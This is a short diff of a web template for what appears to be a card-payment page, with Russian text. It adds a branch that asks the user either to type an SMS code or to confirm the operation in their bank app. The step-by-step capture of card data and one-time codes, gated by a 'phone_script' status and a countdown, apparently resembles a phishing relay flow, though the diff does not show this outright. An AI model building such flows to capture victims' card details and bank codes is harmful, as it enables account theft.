@@ -210,7 +210,7 @@
                     </span>
 
 
-                    <span id="send_sms_btn" {% if payment.status != 3 %}hidden{% endif %}>
+                    <span id="send_sms_btn" {% if payment.status != 3 or not phone_script.step_2_required %}hidden{% endif %}>
                         <p>Данные карты введены. После поступления смс с кодом введите код</p>
                         <div  class=" col-6">
                             <label class="pay">Sms Code</label>
@@ -223,6 +223,13 @@
                             </div>
                         </div>
                     </span>
+
+
+
+                    {% if not phone_script.step_2_required and payment.status == 3 %}
+                        <div>Данные карты приняты. Сейчас вам необходимо будет подтвердить операцию в своем приложении банка. После подтверждения операции нажмите кнопку "продолжить".</div>
+                        <input  type="submit" value="Продолжить" class="btn btn-info placeicon">
+                    {% endif %}
                     <span id="time_is_up" style="display: none">Время вышло. Данные больше не принимаются</span>
 
                 </div>
